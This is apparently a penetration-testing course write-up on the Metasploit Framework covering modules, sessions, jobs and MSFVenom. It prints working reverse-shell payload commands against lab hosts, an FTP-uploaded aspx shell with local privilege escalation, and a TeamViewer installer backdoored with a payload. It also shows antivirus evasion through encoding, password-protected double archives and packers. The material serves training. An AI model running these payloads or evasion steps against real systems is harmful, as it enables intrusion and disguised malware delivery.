Metasploit Framework

Modules, sessions & jobs, the Meterpreter payload, and a high-level look at MSFVenom and AV/IDS evasion. Three skill-assessment labs: Apache Druid RCE, an elFinder → Sudo Baron Samedit chain, and FortiLogger to a SAM dump.

01Modules

Metasploit ships with several module types. Each lives in its own category and serves a distinct role in the exploitation chain.

TypeDescription
AuxiliaryScanning, fuzzing, sniffing, and admin capabilities. Extra assistance and functionality.
EncodersEnsure payloads arrive intact at their destination.
ExploitsExploit a vulnerability to allow payload delivery.
NOPsNo Operation code — keep payload sizes consistent across attempts.
PayloadsCode that runs remotely and calls back to establish a connection/shell.
PluginsExtra scripts integrated into and coexisting with msfconsole.
PostGather information, pivot deeper, etc.
Only Auxiliary, Exploits, and Post are interactive — they can be loaded with the use keyword.

03Encoders

Encoders change a payload so it can run on different operating systems and architectures: x64, x86, sparc, ppc, mips.

Most encoders are detected by modern AV. Encoding alone is rarely enough for evasion today.

List encoders

msf6 > show encoders

Set iterations with -i

$ msfvenom -a x86 --platform windows \ -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 \ -e x86/shikata_ga_nai -f exe -i 10 \ -o /root/Desktop/TeamViewerInstall.exe

Check detection rate (VirusTotal)

$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
04Database & Plugins

Database

MSF can import hosts and scan results, store credentials/loot, and back up its database — keeping hosts, services, and vulnerabilities available at a glance.

05Mixins

MSF is written in Ruby. Mixins are classes that act as methods for other classes without being their parent — so it's inclusion, not inheritance. They're used to provide many optional features to one class, or to reuse one feature across many classes. In Ruby they're implemented as Modules via include.

You don't need to worry about Mixins when starting out — they're noted only to show how deep Metasploit's customization can go.
06Sessions

msfconsole manages multiple modules at once using sessions — dedicated control interfaces for every deployed module. A backgrounded session keeps running and the connection persists, but it can die if the payload runtime tears down the channel.

Background a session

Press [CTRL]+[Z], or type background in a Meterpreter session, then confirm to return to the msf6 > prompt.

List active sessions

msf6 > sessions
Id Type Information Connection 1 meterpreter x86/windows NT AUTHORITY\SYSTEM @ MS01 10.10.10.129:443 -> 10.10.10.205:50501

Interact with a session

msf6 > sessions -i 1 [*] Starting interaction with 1... meterpreter >
Useful for running an extra module on an already-exploited host: background the session, search the second module, then set the session number in its show options. These live in the post category — credential gatherers, local exploit suggesters, internal scanners.
07Jobs

If an active exploit is holding a port you need for another module, you can't just [CTRL]+[C] it — the port stays in use. Use jobs to view and terminate background tasks. Tasks can be converted to jobs so they keep running even if the session dies.

Run an exploit as a job

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0. [*] Started reverse TCP handler on 10.10.14.34:4444

List & kill jobs

msf6 > jobs -l # list all running jobs msf6 > kill 0 # kill one job by index msf6 > jobs -K # kill all jobs

09MSFVenom & Payload Crafting

MSFVenom is the successor to MSFPayload (generated shellcode) and MSFEncode (applied encoders). It crafts payloads for different targets and cleans up shellcode so it runs without errors.

AV evasion is much harder today. Heuristics, machine learning, and deep packet inspection mean running a payload through encoder iterations is no longer enough — a default payload can hit detection rates like 52/65.

FTP + web service scenario windows

Anonymous FTP whose root is served by IIS on tcp/80; uploaded files execute. Drop an .aspx shell via FTP, trigger it from the web, catch a reverse TCP connection.

1
Generate the payload
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
2
Upload via FTP, then set up the handler
ftp> put reverse_shell.aspx $ msfconsole -q msf6 > use multi/handler msf6 exploit(multi/handler) > set LHOST 10.10.14.5 msf6 exploit(multi/handler) > set LPORT 1337 msf6 exploit(multi/handler) > run
3
Trigger & catch

Browse to http://10.10.10.5/reverse_shell.aspx — the page renders blank but the payload runs.

[*] Meterpreter session 1 opened meterpreter > getuid Server username: IIS APPPOOL\Web

Local Exploit Suggester → KiTrap0D

The IIS APPPOOL\Web user has few permissions; the box is x86. Run the suggester, then escalate.

msf6 > use post/multi/recon/local_exploit_suggester msf6 post(...) > set session 2 msf6 post(...) > run # bypassuac_eventvwr fails (IIS user not admin) — ms10_015_kitrap0d works msf6 > use exploit/windows/local/ms10_015_kitrap0d msf6 exploit(...) > set SESSION 3 msf6 exploit(...) > run

10Firewall & IDS/IPS Evasion
Endpoint protection

Localized software protecting one host (PC, workstation, DMZ server). Bundles AV, anti-malware, firewall, anti-DDoS. e.g. Avast, NOD32, Malwarebytes, BitDefender.

Perimeter protection

Physical/virtual devices at the network edge that gate access between public and private zones.

DMZ

A zone between public and private — lower policy than internal, higher trust than the open Internet. Hosts public-facing servers managed from the inside.

How events match a security policy

MethodDescription
Signature-basedCompares packets against pre-built attack patterns. A 100% match raises an alarm.
Heuristic / AnomalyBehavioral comparison against a baseline (incl. known-APT modus operandi). Threshold deviations alarm.
Stateful Protocol AnalysisDetects protocol divergence vs. vendor profiles of accepted, non-malicious activity.
Live Monitoring (SOC)Analysts watch a live feed and action threats manually or via automation.
11Evasion Techniques

Most host AV relies on signature-based detection. Encoding with multiple iterations isn't enough for all AV, and simply establishing a C2 channel can trip IDS/IPS.

AES-encrypted tunnels (MSF6)

MSF6 tunnels AES-encrypted Meterpreter traffic back to the attacker, handling most network IDS/IPS. Combined with Meterpreter running in memory, this raises capability significantly. Strict rulesets may still flag by source IP — the workaround is to use allowed services. (cf. the 2017 Equifax breach: Apache Struts + DNS exfiltration, unnoticed for months.)

The remaining problem is the payload file before it runs — it can be fingerprinted and blocked. AV vendors add default MSF payloads to their databases, so most defaults are caught immediately.

Executable templates (backdooring)

Inject a payload into a legitimate executable to hide shellcode inside real program code.

$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k \ -x ~/Downloads/TeamViewer_Setup.exe \ -e x86/shikata_ga_nai -a x86 --platform windows \ -o ~/Desktop/TeamViewer_Setup.exe -i 5
-k flag: runs the payload in a separate thread so the original app keeps executing normally. Launched from a CLI, a separate window pops up that stays open until the session ends.

Archives

Archiving and password-protecting a payload bypasses many AV signatures. Downside: AV dashboards flag the locked archive as "unable to scan," which an admin can inspect manually.

StageVirusTotal
Raw encoded test.js11 / 59 detections (Shikata.Gen)
Double-archived + password, extension stripped0 / 49 detections
$ rar a ~/test.rar -p ~/test.js # password-protected $ mv test.rar test # strip .rar extension $ rar a test2.rar -p test # archive again $ mv test2.rar test2 $ msf-virustotal -k <API key> -f test2 # 0 / 49

Packers

A packer compresses a payload + executable + decompression code into one file; at runtime the original backdoored executable is restored in memory. msfvenom can compress, restructure, and encrypt the process structure.

Popular: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida. See the PolyPack project.

Exploit coding

Avoid easily fingerprinted code. BoF hex patterns stand out to IDS/IPS — add randomization via the Offset and avoid obvious NOP sleds. Test custom exploit code against a sandbox before deploying on a client network.

'Targets' => [ [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ], ],
